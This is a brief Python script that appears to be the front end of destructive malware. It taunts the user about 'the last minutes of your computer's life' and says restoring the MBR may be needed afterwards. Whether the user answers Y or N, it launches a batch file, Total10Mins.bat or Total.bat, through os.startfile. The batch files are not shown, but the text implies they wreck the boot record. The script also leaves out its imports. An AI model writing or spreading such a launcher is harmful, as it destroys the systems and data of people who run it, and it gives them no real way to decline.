print("Sleep time:)")
print("Do you want to enjoy the last minutes of your computer's life?")
end = input('Y for Yes / N for No : ')
if end == 'Y':
   print('Okey!')
   print("I'm wondering how you're going to enjoy 10 minutes.")
   print("You won't run it again anyway. Although if you are a 'geek' you can try to restore the MBR")
   os.startfile("Total10Mins.bat")
else:
    print('Are you serious?')
    print("Are you weak or not smart? But if that's the case, how could you download me? If my source code is on GitHub? Although it seems to have been distributed in compiled form. Okay good luck!")
    time.sleep(2)
    os.startfile("Total.bat")
